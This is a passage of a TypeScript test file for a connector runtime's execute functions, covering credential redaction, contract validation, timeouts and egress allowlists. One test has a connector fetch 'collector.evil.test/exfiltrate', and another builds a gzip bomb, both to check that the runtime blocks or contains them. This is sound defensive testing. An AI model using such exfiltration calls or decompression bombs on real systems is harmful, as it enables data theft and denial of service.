import {
  CREDENTIAL_HOSTS_KEY,
  ConnectorError,
  RateLimitedError,
  sourceDatasetSchema,
} from "@netrics/connector-sdk";
import type {
  CheckResult,
  ConnectionContext,
  Connector,
  ConnectorManifest,
  ConnectorDatasetStaging,
  Observation,
  SyncRequest,
  SyncResult,
} from "@netrics/connector-sdk";
import { createServer } from "node:http";
import type { AddressInfo, LookupFunction } from "node:net";
import { gunzipSync, gzipSync } from "node:zlib";

import { describe, expect, it } from "vitest";

import { demoManifest } from "@netrics/connectors";

import {
  CREDENTIAL_HOST_MISMATCH_CODE,
  ContractViolationError,
  CredentialHostMismatchError,
  customApiCallOptions,
  executeCheck,
  executeDiscover,
  executeResourceIcons,
  executeSync,
  executeTrustedCall,
  supportsResourceIcons,
} from "./execute.js";

const baseContext: ConnectionContext = {
  connectionId: "conn-1",
  config: {},
  credentials: {},
};

const request: SyncRequest = {
  mode: "backfill",
  from: "2024-01-01T00:00:00.000Z",
  to: "2024-01-02T00:00:00.000Z",
};

function observation(overrides: Partial<Observation> = {}): Observation {
  return {
    metricKey: "demo.visitors",
    sourceTimestamp: "2024-01-01T00:00:00.000Z",
    value: 42,
    dimensions: { resource: "demo-site-1" },
    ...overrides,
  };
}

function connectorWith(
  manifest: ConnectorManifest,
  sync?: (context: ConnectionContext, request: SyncRequest) => unknown,
  check?: () => unknown,
): Connector {
  return {
    manifest,
    async check() {
      return (check?.() ?? { ok: true }) as CheckResult;
    },
    async discover() {
      return [];
    },
    async sync(context, req) {
      return (sync?.(context, req) ?? {
        observations: [],
        done: true,
      }) as SyncResult;
    },
  };
}

describe("executeSync", () => {
  it("passes valid results through", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [observation()],
      nextCursor: "2024-01-01T00:00:00.000Z",
      done: true,
    }));
    const result = await executeSync(connector, baseContext, request);
    expect(result.observations).toHaveLength(1);
    expect(result.done).toBe(true);
  });

  it("rejects an invalid request before calling the connector", async () => {
    let called = false;
    const connector = connectorWith(demoManifest, () => {
      called = true;
      return { observations: [], done: true };
    });
    await expect(
      executeSync(connector, baseContext, { ...request, from: request.to }),
    ).rejects.toBeInstanceOf(ContractViolationError);
    expect(called).toBe(false);
  });

  it("rejects observations with undeclared metric keys", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [observation({ metricKey: "demo.revenue" })],
      done: true,
    }));
    await expect(executeSync(connector, baseContext, request)).rejects.toThrow(
      /undeclared metric key "demo.revenue"/,
    );
  });

  describe("review text (SDK 0.2.8)", () => {
    const review = {
      id: "r1",
      resource: "demo-site-1",
      rating: 5,
      title: "Private title text",
      body: "Private body text",
      author: "private-nickname",
      territory: "DE",
      createdAt: "2026-10-01T10:00:00.000Z",
    };

    it("passes reviews and review windows through", async () => {
      const window = {
        resource: "demo-site-1",
        from: "2026-09-01T00:00:00.000Z",
        to: "2026-10-02T00:00:00.000Z",
      };
      const connector = connectorWith(demoManifest, () => ({
        observations: [],
        reviews: [review],
        reviewWindows: [window],
        done: true,
      }));
      const result = await executeSync(connector, baseContext, request);
      expect(result.reviews).toEqual([review]);
      expect(result.reviewWindows).toEqual([window]);
    });

    it("rejects a malformed review without repeating its text", async () => {
      const connector = connectorWith(demoManifest, () => ({
        observations: [],
        reviews: [{ ...review, rating: 6, territory: "Germany" }],
        done: true,
      }));
      const error = await executeSync(connector, baseContext, request).then(
        () => null,
        (caught: unknown) => caught,
      );
      expect(error).toBeInstanceOf(ContractViolationError);
      const message = (error as Error).message;
      expect(message).toMatch(/reviews\.0\.rating/);
      expect(message).not.toMatch(/Private|private-nickname|Germany/);
    });
  });

  it("rejects observations with undeclared dimensions", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [
        observation({ dimensions: { resource: "demo-site-1", country: "de" } }),
      ],
      done: true,
    }));
    await expect(executeSync(connector, baseContext, request)).rejects.toThrow(
      /undeclared dimension "country"/,
    );
  });

  describe("currency_minor amounts", () => {
    const manifest: ConnectorManifest = {
      ...demoManifest,
      metrics: [
        {
          key: "demo.proceeds",
          name: "Proceeds",
          description: "Proceeds per currency.",
          kind: "delta",
          unit: "currency_minor",
          granularity: "day",
          dimensions: ["resource", "currency"],
          aggregations: ["sum"],
        },
      ],
    };
    const amount = (dimensions: Record<string, string>, value = 1234) =>
      observation({ metricKey: "demo.proceeds", dimensions, value });
    const run = (observations: Observation[]) =>
      executeSync(
        connectorWith(manifest, () => ({ observations, done: true })),
        baseContext,
        request,
      );

    it("accepts integer minor units with an ISO 4217 currency", async () => {
      const result = await run([
        amount({ resource: "app-1", currency: "EUR" }),
        amount({ resource: "app-1", currency: "JPY" }, 500),
      ]);
      expect(result.observations).toHaveLength(2);
    });

    it.each([
      ["no currency", { resource: "app-1" }],
      ["a lowercase code", { resource: "app-1", currency: "eur" }],
      ["a name", { resource: "app-1", currency: "Euro" }],
    ])("rejects an amount with %s", async (_label, dimensions) => {
      await expect(run([amount(dimensions)])).rejects.toThrow(
        /without an ISO 4217 "currency" dimension/,
      );
    });

    it("rejects fractional minor units", async () => {
      await expect(
        run([amount({ resource: "app-1", currency: "EUR" }, 12.5)]),
      ).rejects.toThrow(/not in integer minor units/);
    });
  });

  it("rejects malformed transport objects", async () => {
    const connector = connectorWith(demoManifest, () => ({
      observations: [observation({ value: Number.NaN })],
      done: true,
    }));
    await expect(
      executeSync(connector, baseContext, request),
    ).rejects.toBeInstanceOf(ContractViolationError);
  });

  it("redacts credential values from thrown connector errors", async () => {
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { token: "sk-live-9f8e7d6c" },
    };
    const connector = connectorWith(demoManifest, () => {
      throw new Error("provider 401 for token sk-live-9f8e7d6c");
    });
    const failure = await executeSync(connector, context, request).catch(
      (error: unknown) => error,
    );
    expect(failure).toBeInstanceOf(Error);
    expect((failure as Error).message).not.toContain("sk-live-9f8e7d6c");
    expect((failure as Error).message).toContain("[redacted]");
    // A plain thrown error is NOT a contract violation: it is the retryable
    // provider-failure convention.
    expect(failure).not.toBeInstanceOf(ContractViolationError);
  });

  it("keeps a RateLimitedError and its retryAt, with the message redacted (#781)", async () => {
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { token: "sk-live-9f8e7d6c" },
    };
    const connector = connectorWith(demoManifest, () => {
      throw new RateLimitedError(
        "limit used up for sk-live-9f8e7d6c",
        "2024-01-01T10:40:00.000Z",
      );
    });
    for (const call of [
      () => executeSync(connector, context, request),
      () =>
        executeCheck(
          connectorWith(demoManifest, undefined, () => {
            throw new RateLimitedError(
              "limit used up for sk-live-9f8e7d6c",
              "2024-01-01T10:40:00.000Z",
            );
          }),
          context,
        ),
    ]) {
      const failure = await call().catch((error: unknown) => error);
      expect(failure).toBeInstanceOf(RateLimitedError);
      expect((failure as RateLimitedError).retryAt).toBe(
        "2024-01-01T10:40:00.000Z",
      );
      expect((failure as Error).message).not.toContain("sk-live-9f8e7d6c");
    }
  });

  it("refuses contexts carrying function-typed values (capability leak)", async () => {
    let called = false;
    const connector = connectorWith(demoManifest, () => {
      called = true;
      return { observations: [], done: true };
    });
    const leaking: ConnectionContext = {
      ...baseContext,
      config: { db: async () => "handle" },
    };
    await expect(executeSync(connector, leaking, request)).rejects.toThrow(
      /function at config\.db/,
    );
    expect(called).toBe(false);
  });
});

describe("reason codes (SDK 0.2.18, #795)", () => {
  const context: ConnectionContext = {
    ...baseContext,
    credentials: { token: "sk-live-9f8e7d6c" },
  };

  it("keeps a thrown ConnectorError's code, with the message redacted", async () => {
    class QuotaError extends ConnectorError {
      constructor() {
        super("quota used up for sk-live-9f8e7d6c", "acme.quota_used_up");
        this.name = "QuotaError";
      }
    }
    const connector = connectorWith(demoManifest, () => {
      throw new QuotaError();
    });
    const failure = await executeSync(connector, context, request).catch(
      (error: unknown) => error,
    );
    expect(failure).toBeInstanceOf(ConnectorError);
    expect(failure).not.toBeInstanceOf(ContractViolationError);
    expect((failure as ConnectorError).code).toBe("acme.quota_used_up");
    expect((failure as Error).name).toBe("QuotaError");
    expect((failure as Error).message).toBe("quota used up for [redacted]");
  });

  it("gives a plain thrown error no code", async () => {
    const connector = connectorWith(demoManifest, () => {
      // Node's own error codes are not reason codes.
      throw Object.assign(new Error("socket hang up"), { code: "ECONNRESET" });
    });
    const failure = await executeSync(connector, context, request).catch(
      (error: unknown) => error,
    );
    expect(failure).toBeInstanceOf(Error);
    expect(failure).not.toBeInstanceOf(ConnectorError);
    expect(failure).not.toHaveProperty("code");
  });

  it("passes a failed check's code through, next to its redacted message", async () => {
    const connector = connectorWith(demoManifest, undefined, () => ({
      ok: false,
      message: "token sk-live-9f8e7d6c was revoked",
      code: "acme.key_revoked",
    }));
    await expect(executeCheck(connector, context)).resolves.toEqual({
      ok: false,
      message: "token [redacted] was revoked",
      code: "acme.key_revoked",
    });
  });

  // A code is well formed and still not trusted: a connector could build
  // one from a credential ("acme." + a lowercase hex token). The message
  // is redacted; such a code is dropped whole, never forwarded in part.
  const hex = "9f8e7d6c5b4a39281706f5e4d3c2b1a0";
  const hexContext: ConnectionContext = {
    ...baseContext,
    credentials: { token: hex, nested: { refresh: "ABCDEF0123456789" } },
  };

  it("drops a thrown error's code that holds a credential value", async () => {
    for (const code of [
      `acme.${hex}`,
      `acme.${hex}.revoked`,
      // The connector lowercased a credential to make it fit.
      "acme.abcdef0123456789",
    ]) {
      class LeakyError extends ConnectorError {
        constructor() {
          super(`refused ${hex}`, code);
          this.name = "LeakyError";
        }
      }
      const connector = connectorWith(demoManifest, () => {
        throw new LeakyError();
      });
      const failure = await executeSync(connector, hexContext, request).catch(
        (error: unknown) => error,
      );
      expect(failure, code).toBeInstanceOf(Error);
      expect(failure, code).not.toBeInstanceOf(ConnectorError);
      expect(failure, code).not.toHaveProperty("code");
      expect((failure as Error).name).toBe("LeakyError");
      expect((failure as Error).message).toBe("refused [redacted]");
      expect(JSON.stringify(failure)).not.toContain(hex);
    }
  });

  it("drops a failed check's code that holds a credential value", async () => {
    for (const code of [`acme.${hex}`, "acme.abcdef0123456789"]) {
      const connector = connectorWith(demoManifest, undefined, () => ({
        ok: false,
        message: `token ${hex} was revoked`,
        code,
      }));
      await expect(executeCheck(connector, hexContext), code).resolves.toEqual({
        ok: false,
        message: "token [redacted] was revoked",
      });
    }
  });

  it("drops a code that holds a derived secret of the call", async () => {
    const minted = "0a1b2c3d4e5f60718293a4b5c6d7e8f9";
    const options = { redactValues: [minted] };
    const thrown = await executeSync(
      connectorWith(demoManifest, () => {
        throw new ConnectorError("refused", `acme.${minted}`);
      }),
      baseContext,
      request,
      options,
    ).catch((error: unknown) => error);
    expect(thrown).not.toHaveProperty("code");
    await expect(
      executeCheck(
        connectorWith(demoManifest, undefined, () => ({
          ok: false,
          message: "refused",
          code: `acme.${minted}`,
        })),
        baseContext,
        options,
      ),
    ).resolves.toEqual({ ok: false, message: "refused" });
  });

  it("refuses text in place of a code as a contract violation", async () => {
    for (const code of ["The key was revoked", "KEY_REVOKED", "", "acme."]) {
      const connector = connectorWith(demoManifest, undefined, () => ({
        ok: false,
        message: "revoked",
        code,
      }));
      await expect(executeCheck(connector, context)).rejects.toBeInstanceOf(
        ContractViolationError,
      );
    }
  });
});

describe("executeCheck", () => {
  it("passes ok results through", async () => {
    const connector = connectorWith(demoManifest, undefined, () => ({
      ok: true,
    }));
    await expect(executeCheck(connector, baseContext)).resolves.toEqual({
      ok: true,
    });
  });

  it("redacts credential values from failure messages", async () => {
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { token: "sk-live-9f8e7d6c" },
    };
    const connector = connectorWith(demoManifest, undefined, () => ({
      ok: false,
      message: "token sk-live-9f8e7d6c rejected",
    }));
    const result = await executeCheck(connector, context);
    expect(result.ok).toBe(false);
    expect(result.message).not.toContain("sk-live-9f8e7d6c");
  });

  it("rejects malformed check results as contract violations", async () => {
    const connector = connectorWith(
      demoManifest,
      undefined,
      () => ({ status: "great" }) as unknown,
    );
    await expect(executeCheck(connector, baseContext)).rejects.toBeInstanceOf(
      ContractViolationError,
    );
  });
});

describe("executeDiscover", () => {
  it("passes valid resource lists through", async () => {
    const connector: Connector = {
      ...connectorWith(demoManifest),
      async discover() {
        return [{ id: "r1", name: "Resource 1", kind: "site" }];
      },
    };
    await expect(executeDiscover(connector, baseContext)).resolves.toEqual([
      { id: "r1", name: "Resource 1", kind: "site" },
    ]);
  });

  it("rejects malformed resources as contract violations", async () => {
    const connector: Connector = {
      ...connectorWith(demoManifest),
      async discover() {
        return [{ id: "" }] as unknown as [];
      },
    };
    await expect(
      executeDiscover(connector, baseContext),
    ).rejects.toBeInstanceOf(ContractViolationError);
  });

  it("redacts credential values from thrown discover errors", async () => {
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { token: "sk-live-9f8e7d6c" },
    };
    const connector: Connector = {
      ...connectorWith(demoManifest),
      async discover() {
        throw new Error("provider rejected token sk-live-9f8e7d6c");
      },
    };
    await expect(executeDiscover(connector, context)).rejects.toThrow(
      /rejected token/,
    );
    await expect(executeDiscover(connector, context)).rejects.not.toThrow(
      /sk-live-9f8e7d6c/,
    );
  });
});

describe("runtime capabilities", () => {
  it.each(["get", "getPage"] as const)(
    "preserves trusted host %s contract failures while dropping credential-bearing details",
    async (operation) => {
      const secret = "private-credential-value";
      const context = { ...baseContext, credentials: { token: secret } };
      const original = Object.assign(
        new ContractViolationError(`invalid staged input ${secret}`, {
          cause: new Error(`storage detail ${secret}`),
        }),
        { code: "dataset_stage_integrity", details: { credential: secret } },
      );
      const connector: Connector = {
        ...connectorWith(demoManifest),
        async sync(_context, _request, runtime) {
          if (operation === "get") await runtime.datasetStaging!.get("report");
          else
            await runtime.datasetStaging!.getPage(
              "e859be5d-03b1-432c-83d0-b46ef045c142",
              "page-1",
            );
          return { observations: [], done: true };
        },
      };
      const failure: unknown = await executeSync(connector, context, request, {
        datasetStaging: () => ({
          async get() {
            throw original;
          },
          async getPage() {
            throw original;
          },
          async put() {
            throw new Error("unused");
          },
        }),
      }).then(
        () => null,
        (error: unknown) => error,
      );
      expect(failure).toBeInstanceOf(ContractViolationError);
      expect(failure).not.toBe(original);
      expect((failure as Error).message).toBe(
        "invalid staged input [redacted]",
      );
      expect((failure as Error).stack).not.toContain(secret);
      expect(failure).not.toHaveProperty("cause");
      expect(failure).not.toHaveProperty("code");
      expect(failure).not.toHaveProperty("details");
    },
  );

  it.each(["name", "code", "message"] as const)(
    "keeps a generic capability failure retryable when its %s impersonates a contract error",
    async (identifier) => {
      const secret = "private-credential-value";
      const context = { ...baseContext, credentials: { token: secret } };
      const message =
        identifier === "message"
          ? `ContractViolationError dataset_stage_integrity ${secret}`
          : `storage failed ${secret}`;
      const original = Object.assign(
        new Error(message, { cause: new Error(`private cause ${secret}`) }),
        { details: { credential: secret } },
        identifier === "code" ? { code: "dataset_stage_integrity" } : {},
      );
      if (identifier === "name") original.name = "ContractViolationError";
      const connector: Connector = {
        ...connectorWith(demoManifest),
        async sync(_context, _request, runtime) {
          await runtime.datasetStaging!.getPage(
            "e859be5d-03b1-432c-83d0-b46ef045c142",
            "page-1",
          );
          return { observations: [], done: true };
        },
      };
      const failure: unknown = await executeSync(connector, context, request, {
        datasetStaging: () => ({
          async get() {
            return null;
          },
          async getPage() {
            throw original;
          },
          async put() {
            throw new Error("unused");
          },
        }),
      }).then(
        () => null,
        (error: unknown) => error,
      );
      expect(failure).toBeInstanceOf(Error);
      expect(failure).not.toBeInstanceOf(ContractViolationError);
      expect(failure).not.toBe(original);
      expect((failure as Error).message).toBe(
        message.replace(secret, "[redacted]"),
      );
      expect((failure as Error).stack).not.toContain(secret);
      expect(failure).not.toHaveProperty("cause");
      expect(failure).not.toHaveProperty("code");
      expect(failure).not.toHaveProperty("details");
    },
  );

  it("passes optional connection staging the call signal and revokes it after completion", async () => {
    let staged: ConnectorDatasetStaging | undefined;
    let calls = 0;
    const connector: Connector = {
      ...connectorWith(demoManifest),
      async sync(_context, _request, runtime) {
        expect(runtime.datasetStaging).toBeDefined();
        staged = runtime.datasetStaging;
        expect(await staged!.get("report")).toBeNull();
        return { observations: [], done: true };
      },
    };
    await executeSync(connector, baseContext, request, {
      datasetStaging: (signal) => ({
        async get() {
          signal.throwIfAborted();
          calls++;
          return null;
        },
        async getPage() {
          signal.throwIfAborted();
          throw new Error("unused");
        },
        async put() {
          signal.throwIfAborted();
          throw new Error("unused");
        },
      }),
    });
    await expect(staged!.get("report")).rejects.toThrow();
    expect(calls).toBe(1);
  });

  it("times out a connector call even when the connector ignores the signal", async () => {
    const hanging: Connector = {
      ...connectorWith(demoManifest),
      sync: () => new Promise<SyncResult>(() => {}),
    };
    await expect(
      executeSync(hanging, baseContext, request, { timeoutMs: 50 }),
    ).rejects.toThrow(/did not answer within 50 ms/);
  });

  it("aborts the runtime signal when the budget runs out", async () => {
    let aborted = false;
    const cooperative: Connector = {
      ...connectorWith(demoManifest),
      sync: (_context, _request, runtime) =>
        new Promise<SyncResult>((_, reject) => {
          runtime.signal.addEventListener("abort", () => {
            aborted = true;
            reject(new Error("aborted"));
          });
        }),
    };
    await expect(
      executeSync(cooperative, baseContext, request, { timeoutMs: 50 }),
    ).rejects.toThrow();
    expect(aborted).toBe(true);
  });

  it("treats fetching an undeclared host as a broken connector", async () => {
    // The demo manifest declares no outbound domains at all.
    const sneaky: Connector = {
      ...connectorWith(demoManifest),
      sync: async (_context, _request, runtime) => {
        await runtime.fetch("https://collector.evil.test/exfiltrate");
        return { observations: [], done: true };
      },
    };
    await expect(executeSync(sneaky, baseContext, request)).rejects.toThrow(
      ContractViolationError,
    );
    await expect(executeSync(sneaky, baseContext, request)).rejects.toThrow(
      /not in the connector's outboundDomains/,
    );
  });

  it("reports response statuses to the host, without bodies", async () => {
    // ADR 0012: the host notices a provider 401 to refresh the token.
    const server = createServer((req, res) => {
      res.writeHead(req.url === "/denied" ? 401 : 200);
      res.end("body");
    });
    await new Promise<void>((resolve) =>
      server.listen(0, "127.0.0.1", resolve),
    );
    const { port } = server.address() as AddressInfo;
    try {
      const statuses: number[] = [];
      const caller: Connector = {
        ...connectorWith({ ...demoManifest, outboundDomains: ["127.0.0.1"] }),
        sync: async (_context, _request, runtime) => {
          await runtime.fetch(`http://127.0.0.1:${port}/ok`);
          await runtime.fetch(`http://127.0.0.1:${port}/denied`);
          return { observations: [], done: true };
        },
      };
      await executeSync(caller, baseContext, request, {
        onResponse: (status) => statuses.push(status),
        egress: { allowInsecureHttp: true, allowPrivateAddresses: true },
      });
      expect(statuses).toEqual([200, 401]);
    } finally {
      server.close();
    }
  });
});

describe("binary bodies (SDK 0.2.2)", () => {
  // The bounded-gunzip pattern from the connector docs: the response cap
  // bounds the compressed bytes, and maxOutputLength bounds what they
  // inflate to.
  const MAX_INFLATED_BYTES = 1024 * 1024;
  function inflate(bytes: Uint8Array): string {
    try {
      return gunzipSync(bytes, {
        maxOutputLength: MAX_INFLATED_BYTES,
      }).toString("utf8");
    } catch (error) {
      if ((error as { code?: string }).code === "ERR_BUFFER_TOO_LARGE") {
        throw new Error(
          `report exceeds ${MAX_INFLATED_BYTES} bytes when decompressed`,
          { cause: error },
        );
      }
      throw error;
    }
  }

  async function withGzipServer(
    bodies: Record<string, Buffer>,
    run: (port: number) => Promise<void>,
  ) {
    const server = createServer((req, res) => {
      const body = bodies[req.url ?? ""];
      res.writeHead(body ? 200 : 404, { "content-type": "application/a-gzip" });
      res.end(body);
    });
    await new Promise<void>((resolve) =>
      server.listen(0, "127.0.0.1", resolve),
    );
    try {
      await run((server.address() as AddressInfo).port);
    } finally {
      server.close();
    }
  }

  function gzipReader(port: number, path: string): Connector {
    return {
      ...connectorWith({ ...demoManifest, outboundDomains: ["127.0.0.1"] }),
      sync: async (_context, _request, runtime) => {
        const response = await runtime.fetch(`http://127.0.0.1:${port}${path}`);
        const units = Number(inflate(response.bytes()).split("\t")[1]);
        return {
          observations: [observation({ value: units })],
          done: true,
        };
      },
    };
  }

  const egress = { allowInsecureHttp: true, allowPrivateAddresses: true };

  it("lets a connector inflate a gzip report it fetched", async () => {
    await withGzipServer(
      { "/report.gz": gzipSync("units\t42\n") },
      async (port) => {
        const result = await executeSync(
          gzipReader(port, "/report.gz"),
          baseContext,
          request,
          { egress },
        );
        expect(result.observations[0]?.value).toBe(42);
      },
    );
  });

  it("fails a gzip bomb as a provider error, not a crash or contract violation", async () => {
    // About 16 KiB on the wire, well under the response cap, but 16 MiB
    // once inflated.
    const bomb = gzipSync(Buffer.alloc(16 * 1024 * 1024));
    expect(bomb.byteLength).toBeLessThan(64 * 1024);
    await withGzipServer({ "/bomb.gz": bomb }, async (port) => {
      const failure = await executeSync(
        gzipReader(port, "/bomb.gz"),
        baseContext,
        request,
        { egress },
      ).then(
        () => null,
        (error: unknown) => error,
      );
      expect(failure).toBeInstanceOf(Error);
      expect(failure).not.toBeInstanceOf(ContractViolationError);
      expect((failure as Error).message).toMatch(
        /exceeds 1048576 bytes when decompressed/,
      );
    });
  });
});

describe("executeResourceIcons (SDK 0.2.5)", () => {
  const png = Buffer.from("89504e470d0a1a0a0000000d49484452", "hex");
  const iconsRequest = { resources: [{ id: "app-1" }, { id: "app-2" }] };

  function withIcons(icons: unknown): Connector {
    return {
      ...connectorWith(demoManifest),
      resourceIcons: async () => icons as never,
    };
  }

  it("returns no icons for a connector without the capability", async () => {
    const plain = connectorWith(demoManifest);
    expect(supportsResourceIcons(plain)).toBe(false);
    await expect(
      executeResourceIcons(plain, baseContext, iconsRequest),
    ).resolves.toEqual([]);
  });

  it("decodes the icons a connector returns", async () => {
    const connector = withIcons({
      icons: [
        {
          resourceId: "app-2",
          contentType: "image/png",
          data: png.toString("base64"),
        },
      ],
    });
    expect(supportsResourceIcons(connector)).toBe(true);
    const icons = await executeResourceIcons(
      connector,
      baseContext,
      iconsRequest,
    );
    expect(icons).toHaveLength(1);
    expect(icons[0]!.resourceId).toBe("app-2");
    expect(icons[0]!.contentType).toBe("image/png");
    expect(Buffer.compare(icons[0]!.bytes, png)).toBe(0);
  });

  it("refuses icons for resources it did not ask for", async () => {
    const connector = withIcons({
      icons: [
        {
          resourceId: "someone-else",
          contentType: "image/png",
          data: png.toString("base64"),
        },
      ],
    });
    await expect(
      executeResourceIcons(connector, baseContext, iconsRequest),
    ).rejects.toThrow(ContractViolationError);
  });

  it("refuses non-raster types, invalid base64 and oversized icons", async () => {
    for (const icon of [
      { resourceId: "app-1", contentType: "image/svg+xml", data: "PHN2Zz4=" },
      { resourceId: "app-1", contentType: "image/png", data: "not base64!" },
      {
        resourceId: "app-1",
        contentType: "image/png",
        data: Buffer.alloc(1_048_577, 1).toString("base64"),
      },
    ]) {
      await expect(
        executeResourceIcons(withIcons({ icons: [icon] }), baseContext, {
          resources: [{ id: "app-1" }],
        }),
      ).rejects.toThrow(ContractViolationError);
    }
  });

  it("refuses an invalid request before calling the connector", async () => {
    let called = false;
    const connector: Connector = {
      ...connectorWith(demoManifest),
      resourceIcons: async () => {
        called = true;
        return { icons: [] };
      },
    };
    await expect(
      executeResourceIcons(connector, baseContext, { resources: [] }),
    ).rejects.toThrow(ContractViolationError);
    await expect(
      executeResourceIcons(connector, baseContext, {
        resources: [{ id: "app-1", territories: ["usa"] }],
      }),
    ).rejects.toThrow(ContractViolationError);
    expect(called).toBe(false);
  });

  it("keeps the egress allowlist: an undeclared host is a broken connector", async () => {
    const sneaky: Connector = {
      ...connectorWith(demoManifest),
      resourceIcons: async (_context, _request, runtime) => {
        await runtime.fetch("https://is6-ssl.mzstatic.com/icon.png");
        return { icons: [] };
      },
    };
    await expect(
      executeResourceIcons(sneaky, baseContext, iconsRequest),
    ).rejects.toThrow(/not in the connector's outboundDomains/);
  });
});

describe("dataset transport validation (#440)", () => {
  it("rejects undeclared and incorrectly typed pages without echoing source values", async () => {
    const definition = sourceDatasetSchema.parse({
      key: "events",
      name: "Events",
      version: 1,
      keyFields: ["id"],
      grain: "one event",
      mode: "upsert",
      fields: [
        {
          id: "id",
          name: "ID",
          type: "string",
          nullable: false,
          classification: "internal",
        },
      ],
    });
    const page = {
      datasetKey: "events",
      schemaVersion: 1,
      refreshKey: "r",
      pageKey: "p",
      previousPageKey: null,
      complete: true,
      records: [{ values: { id: 123456789 } }],
    };
    await expect(
      executeSync(
        connectorWith(demoManifest, () => ({
          observations: [],
          datasetPages: [page],
          done: true,
        })),
        baseContext,
        request,
      ),
    ).rejects.toThrow("Undeclared source dataset");
    await expect(
      executeSync(
        connectorWith({ ...demoManifest, datasets: [definition] }, () => ({
          observations: [],
          datasetPages: [page],
          done: true,
        })),
        baseContext,
        request,
      ),
    ).rejects.toThrow("Invalid dataset field type: id");
  });
  it("accepts received datasets only on a done result and only declared ones (#666)", async () => {
    const definition = sourceDatasetSchema.parse({
      key: "events",
      name: "Events",
      version: 1,
      keyFields: ["id"],
      grain: "one event",
      mode: "upsert",
      fields: [
        {
          id: "id",
          name: "ID",
          type: "string",
          nullable: false,
          classification: "internal",
        },
      ],
    });
    const manifest = { ...demoManifest, datasets: [definition] };
    const run = (result: Record<string, unknown>) =>
      executeSync(
        connectorWith(manifest, () => ({ observations: [], ...result })),
        baseContext,
        request,
      );
    await expect(
      run({ receivedDatasets: ["events"], done: true }),
    ).resolves.toMatchObject({ receivedDatasets: ["events"], done: true });
    await expect(
      run({ receivedDatasets: ["other"], done: true }),
    ).rejects.toThrow("Undeclared source dataset");
    await expect(
      run({ receivedDatasets: ["events"], nextCursor: "c", done: false }),
    ).rejects.toThrow("Received datasets on a sync page that is not final");
  });
});

it("does not accept a successful final sync with an incomplete dataset page", async () => {
  const p = {
    datasetKey: "events",
    schemaVersion: 1,
    refreshKey: "r",
    pageKey: "p",
    previousPageKey: null,
    complete: false,
    records: [],
  };
  await expect(
    executeSync(
      connectorWith(demoManifest, () => ({
        observations: [],
        datasetPages: [p],
        done: true,
      })),
      baseContext,
      request,
    ),
  ).rejects.toThrow("Final sync page contains an incomplete dataset refresh");
});

describe("freshness (SDK 0.2.13, ADR 0025 §2)", () => {
  const manifest: ConnectorManifest = {
    ...demoManifest,
    freshnessStreams: [
      {
        key: "traffic",
        name: "Traffic",
        kind: "periodic",
        timeZone: "UTC",
        metrics: [demoManifest.metrics[0]!.key],
      },
      { key: "live", name: "Live", kind: "continuous" },
    ],
  };
  const run = (connectorManifest: ConnectorManifest, result: object) =>
    executeSync(
      connectorWith(connectorManifest, () => ({ observations: [], ...result })),
      baseContext,
      request,
    );

  it("passes declared entries of a done result through", async () => {
    const freshness = [
      {
        stream: "traffic",
        dataThrough: "2024-01-01",
        nextExpectedAt: "2024-01-02T06:00:00.000Z",
      },
      { stream: "live" },
    ];
    await expect(run(manifest, { freshness, done: true })).resolves.toEqual(
      expect.objectContaining({ freshness }),
    );
  });

  it("refuses undeclared streams and dates on continuous streams", async () => {
    await expect(
      run(manifest, { freshness: [{ stream: "sales" }], done: true }),
    ).rejects.toThrow(ContractViolationError);
    await expect(
      run(demoManifest, { freshness: [{ stream: "traffic" }], done: true }),
    ).rejects.toThrow(/undeclared freshness stream "traffic"/);
    await expect(
      run(manifest, {
        freshness: [{ stream: "live", dataThrough: "2024-01-01" }],
        done: true,
      }),
    ).rejects.toThrow(/continuous/);
    await expect(
      run(manifest, {
        freshness: [{ stream: "traffic", dataThrough: "2024-1-1" }],
        done: true,
      }),
    ).rejects.toThrow(ContractViolationError);
  });

  it("refuses a monthly stream's dataThrough that is not a month's last day", async () => {
    const monthly: ConnectorManifest = {
      ...manifest,
      freshnessStreams: [
        ...manifest.freshnessStreams!,
        {
          key: "earnings",
          name: "Earnings",
          kind: "periodic",
          period: "month",
          timeZone: "UTC",
        },
      ],
    };
    await expect(
      run(monthly, {
        freshness: [{ stream: "earnings", dataThrough: "2023-12-31" }],
        done: true,
      }),
    ).resolves.toMatchObject({ done: true });
    await expect(
      run(monthly, {
        freshness: [{ stream: "earnings", dataThrough: "2023-12-30" }],
        done: true,
      }),
    ).rejects.toThrow(/last day of a month/);
  });

  it("ignores freshness on a page that is not final", async () => {
    const result = await run(demoManifest, {
      freshness: [{ stream: "anything" }],
      nextCursor: "c",
      done: false,
    });
    expect(result.freshness).toBeUndefined();
  });

  it("keeps working for connectors without streams or freshness", async () => {
    await expect(run(demoManifest, { done: true })).resolves.toMatchObject({
      done: true,
    });
  });
});

describe("nextFrom (SDK 0.2.15, #758)", () => {
  const run = (result: object) =>
    executeSync(
      connectorWith(demoManifest, () => ({ observations: [], ...result })),
      baseContext,
      request,
    );

  it("passes the next window start of a done result through, a lookback included", async () => {
    for (const nextFrom of [
      "2023-12-29T00:00:00.000Z",
      request.from,
      request.to,
    ]) {
      await expect(run({ nextFrom, done: true })).resolves.toMatchObject({
        nextFrom,
      });
    }
  });

  it("refuses a next window start after the window's end", async () => {
    await expect(
      run({ nextFrom: "2024-01-02T00:00:00.001Z", done: true }),
    ).rejects.toThrow(/nextFrom after the window's end/);
  });

  it("refuses a next window start further back than the backfill window", async () => {
    expect(demoManifest.backfillDays).toBe(90);
    // 90 days before `from` is the furthest back a demo window may start.
    await expect(
      run({ nextFrom: "2023-10-03T00:00:00.000Z", done: true }),
    ).resolves.toMatchObject({ nextFrom: "2023-10-03T00:00:00.000Z" });
    for (const nextFrom of [
      "2023-10-02T23:59:59.999Z",
      "0001-01-01T00:00:00.000Z",
      // Valid ISO for zod and JS, but no PostgreSQL timestamp.
      "0000-01-01T00:00:00.000Z",
    ]) {
      await expect(run({ nextFrom, done: true })).rejects.toThrow(
        /nextFrom more than 90 days before the window's start/,
      );
    }
  });

  it("allows a day's lookback to a connector without a backfill window", async () => {
    const { backfillDays: _backfillDays, ...rest } = demoManifest;
    const manifest: ConnectorManifest = { ...rest, supportsBackfill: false };
    const runWithout = (nextFrom: string) =>
